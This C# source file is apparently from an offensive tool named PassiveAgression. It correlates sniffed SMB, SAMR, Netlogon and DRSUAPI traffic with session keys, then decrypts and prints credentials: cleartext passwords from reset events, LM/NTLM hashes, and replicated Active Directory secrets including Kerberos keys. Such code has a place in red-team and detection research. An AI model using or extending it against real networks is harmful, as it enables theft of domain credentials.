using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json.Bson;
using PassiveAgression.Core.Events;
using static System.Net.Mime.MediaTypeNames;

namespace PassiveAgression.Core
{
    public class DataHandler
    {
        private ConcurrentBag<SMBSessionNegotiation>           SMBSessionNegotiations          = new();
        private ConcurrentBag<SMBSessionSetup>                 SMBSessionSetups                = new();
        private ConcurrentBag<LookupNamesRequest>              LookupNamesRequests             = new();

        private ConcurrentQueue<SamrSetInformationUser2> setInformationUser2   = new ConcurrentQueue<SamrSetInformationUser2>();

        CancellationTokenSource cancellationTokenSource = new CancellationTokenSource();

        public ConcurrentBag<SamrSetInformationUser2> DecryptedSamrSetInformationUser2Events = new();

        private ConcurrentBag<NetRServerAuthenticate3Response> NetRServerAuthenticate3Response = new();
        private ConcurrentQueue<NetRLogonSendToSam> netrLogonSendToSam = new ConcurrentQueue<NetRLogonSendToSam>();
        public ConcurrentBag<NetRLogonSendToSam> DecryptedLogonSendToSams = new();

        private ConcurrentBag<RPCBinding> RPCBinds = new();
        public ConcurrentBag<GetNCChangesResponse> DecryptedGetNcChangesResponses = new();
        private ConcurrentQueue<GetNCChangesResponse> getNcChangesResponses = new ConcurrentQueue<GetNCChangesResponse>();



        #region adding methods

        /// <summary>
        /// Adds new RPCBind to the list
        /// </summary>
        /// <param name="rpcBinding"></param>
        public void AddRPCBinding(RPCBinding rpcBinding)
        {
            if (rpcBinding == null)
                return;

            if (!rpcBinding.success)
                return;

            if (RPCBinds.Contains(rpcBinding))
                return;

            RPCBinds.Add(rpcBinding);
        }

        /// <summary>
        /// Adds GetNCChangesResponse to the queue
        /// </summary>
        /// <param name="ncChangesResponse"></param>
        public void AddGetNCChanges(GetNCChangesResponse ncChangesResponse)
        {
            if (ncChangesResponse == null)
                return;

            if (!ncChangesResponse.success)
                return;

            if (getNcChangesResponses.Contains(ncChangesResponse))
                return;

            getNcChangesResponses.Enqueue(ncChangesResponse);
        }




        /// <summary>
        /// Adds new NetRServerAuthenticate3Response event to the list
        /// </summary>
        /// <param name="netrServerAuthenticate3Response"></param>
        public void AddNetrServerAuthenticate3Response(NetRServerAuthenticate3Response netrServerAuthenticate3Response)
        {
            if (netrServerAuthenticate3Response == null)
                return;

            if (!netrServerAuthenticate3Response.success)
                return;

            if (NetRServerAuthenticate3Response.Contains(netrServerAuthenticate3Response))
                return;

            NetRServerAuthenticate3Response.Add(netrServerAuthenticate3Response);
        }

        /// <summary>
        /// Adds NetRLogonSendToSam event to the queue
        /// </summary>
        /// <param name="sendtosam"></param>
        public void AddSendToSam(NetRLogonSendToSam sendtosam)
        {
            if (sendtosam == null)
                return;

            if (!sendtosam.success)
                return;

            if (netrLogonSendToSam.Contains(sendtosam))
                return;

            netrLogonSendToSam.Enqueue(sendtosam);
        }



        /// <summary>
        /// Adds new SMBSessionNegotiation event to the list
        /// </summary>
        /// <param name="smbSessionNegotiation"></param>
        public void AddSMBSessionNegotiation(SMBSessionNegotiation smbSessionNegotiation)
        {
            if (smbSessionNegotiation == null)
                return;

            if (!smbSessionNegotiation.success)
                return;

            if (SMBSessionNegotiations.Contains(smbSessionNegotiation))
                return;

            SMBSessionNegotiations.Add(smbSessionNegotiation);
        }

        /// <summary>
        /// Adds new SMBSessionSetup event to the list
        /// </summary>
        /// <param name="smbSessionSetup"></param>
        public void AddSMBSessionSetup(SMBSessionSetup smbSessionSetup)
        {
            if (smbSessionSetup == null)
                return;

            if (!smbSessionSetup.success)
                return;

            if (SMBSessionSetups.Contains(smbSessionSetup))
                return;

            SMBSessionSetups.Add(smbSessionSetup);
        }

        /// <summary>
        /// Adds new LookupNamesRequest to the list
        /// </summary>
        /// <param name="lookupNamesRequest"></param>
        public void AddLookupNamesRequest(LookupNamesRequest lookupNamesRequest)
        {
            if (lookupNamesRequest == null)
                return;

            if (!lookupNamesRequest.success)
                return;

            if (LookupNamesRequests.Contains(lookupNamesRequest))
                return;

            LookupNamesRequests.Add(lookupNamesRequest);
        }

 

        /// <summary>
        /// Adds password reset event to the queue
        /// </summary>
        /// <param name="pwdreset"></param>
        public void AddSetInformationUser2(SamrSetInformationUser2 pwdreset)
        {
            if (pwdreset == null)
                return;

            if (!pwdreset.success)
                return;

            if (setInformationUser2.Contains(pwdreset))
                return;

            setInformationUser2.Enqueue(pwdreset);

        }

        #endregion

        #region Printing methods

        private void PrintPwdReset(SamrSetInformationUser2 pwdreset)
        {
            Console.WriteLine("\r\n[+] Got password reset event:");
            Console.WriteLine($"\tUsername:\t{pwdreset.Username}");
            Console.WriteLine($"\tNew password:\t{pwdreset.ClearTextPassword}");
        }

        private void PrintSendToSam(NetRLogonSendToSam logonSendToSam)
        {

            if (string.IsNullOrEmpty(logonSendToSam.LMHash) &&
                string.IsNullOrEmpty(logonSendToSam.NTLMHash))
                return;

            Console.WriteLine($"");
            Console.WriteLine("[+] NetrLogonSendToSam data: ");
            Console.WriteLine($"\tUser:\t{logonSendToSam.UserRef}");
            Console.WriteLine($"\trID:\t{logonSendToSam.rID}");
            Console.WriteLine($"\tLM:\t{logonSendToSam.LMHash}");
            Console.WriteLine($"\tNTLM:\t{logonSendToSam.NTLMHash}");
        }

        private void PrintReplSecrets(GetNCChangesResponse.ReplicatedSecrets[] replsecrets)
        {
            foreach (var secrets in replsecrets)
            {
                Console.WriteLine($"");
                Console.WriteLine("[+] Replicated secret: ");
                Console.WriteLine($"\tDN:\t{secrets.DN}");
                Console.WriteLine($"\tSID:\t{secrets.SID}");
                Console.WriteLine($"\tGUID:\t{secrets.GUID}");
                Console.WriteLine($"");
                Console.WriteLine($"\tNTLM:\t{secrets.ntlmHash}");

                if (!string.IsNullOrEmpty(secrets.lmHash))
                    Console.WriteLine($"\tLM:\t{secrets.lmHash}");

                Console.WriteLine($"\tsalt:\t{secrets.kerberos_new_salt}");
                Console.WriteLine($"\taes256:\t{secrets.aes256}");
                Console.WriteLine($"\taes128:\t{secrets.aes128}");
                Console.WriteLine($"\tdes:\t{secrets.md5}");
            }


        }


        #endregion

        public async Task Start()
        {

            var cancellationToken = cancellationTokenSource.Token;
            Task checkQueueTask = CheckQueuePeriodically(TimeSpan.FromMilliseconds(500), cancellationToken);
            //checkQueueTask.Start();
            await checkQueueTask;
        }

        public void Stop()
        {
            cancellationTokenSource.Cancel();

            // Make sure to process all remaining tasks
            ProcessTasks();
        }

        private async Task CheckQueuePeriodically(TimeSpan interval, CancellationToken cancellationToken)
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                ProcessTasks();
                await Task.Delay(interval);
            }
        }

        private void ProcessTasks()
        {
            while (!setInformationUser2.IsEmpty)
                ProcessSetInformationUser2();
            
                
            while (!netrLogonSendToSam.IsEmpty) 
                ProcessNetrLogonSendToSam();

            if (!getNcChangesResponses.IsEmpty)
                ProcessGetNCChanges();
        }

        /// <summary>
        /// Contains logic to find correct session key, SMB dialect and decrypt contents
        /// </summary>
        private void ProcessSetInformationUser2()
        {
            // Fetch from queue
            SamrSetInformationUser2 response;
            var                successDequeue = setInformationUser2.TryDequeue(out response);

            if (!successDequeue)
                return;

            // Check if there's a sessionkey available with the same smbsession Id
            var smbSessionIds = SMBSessionSetups.Where(k => k.smbSessionId == response.smbSessionId
                                                       && !string.IsNullOrEmpty(k.sessionKey)).ToList();

            // There is not. Add back to the queue
            if (!smbSessionIds.Any())
            {
                setInformationUser2.Enqueue(response);
                return;
            }

            // Lookup user account
            var nameLookupRes = LookupNamesRequests.Where(n => n.smbSessionId == response.smbSessionId);
            if (!nameLookupRes.Any())
            {
                setInformationUser2.Enqueue(response);
                return;
            }

            var name = nameLookupRes.First();
            response.Username = name.Username;

            // There is. Select session key and decrypt data
            response.Decrypt(smbSessionIds[0]);

            if (response.success)
            {
                PrintPwdReset(response);
                DecryptedSamrSetInformationUser2Events.Add(response);
            }
        }


        /// <summary>
        /// Contains logic to find session key to decrypt contents
        /// and decode the data
        /// </summary>
        private void ProcessNetrLogonSendToSam()
        {
            // Fetch from queue
            NetRLogonSendToSam response;
            var successDequeue = netrLogonSendToSam.TryDequeue(out response);

            if (!successDequeue)
                return;

            // Check if there's netrServerAuthenticate3 event available in the same stream
            var authResponses = NetRServerAuthenticate3Response
                          .Where(b => b.connectionInfo.StreamIndex == response.connectionInfo.StreamIndex &&
                                      b.connectionInfo.SourceIP == response.connectionInfo.DestinationIP).ToList();

            // There is not. Add back to the queue
            if (!authResponses.Any())
            {
                netrLogonSendToSam.Enqueue(response);
                return;
            }

            // There is. Select session key and decrypt data
            var sessionKey = authResponses[0].sessionKey;
            response.Decrypt(sessionKey);

            if (response.success)
            {
                PrintSendToSam(response);
                DecryptedLogonSendToSams.Add(response);
            }
        }


        /// <summary>
        /// Contains logic to find correct session key and decrypt the contents
        /// and decode the data
        /// </summary>
        private void ProcessGetNCChanges()
        {
            // Fetch from queue
            GetNCChangesResponse response;
            var successDequeue = getNcChangesResponses.TryDequeue(out response);

            if (!successDequeue)
                return;

            // Check if there's an RPC bind available with the same stream and sourceIp
            var bindings = RPCBinds
                                .Where(b => b.connectionInfo.StreamIndex == response.connectionInfo.StreamIndex &&
                                       b.connectionInfo.SourceIP == response.connectionInfo.SourceIP).ToList();

            // There is not. Add back to the queue
            if (!bindings.Any())
            {
                getNcChangesResponses.Enqueue(response);
                return;
            }

            // There is. Select session key and decrypt data
            var sessionKey = bindings.Select(b => b.sessionKey).SelectMany(a => a).First();
            response.Decrypt(sessionKey);


            if (response.success)
            {
                PrintReplSecrets(response.Secrets);
                DecryptedGetNcChangesResponses.Add(response);
            }

        }

    }
}
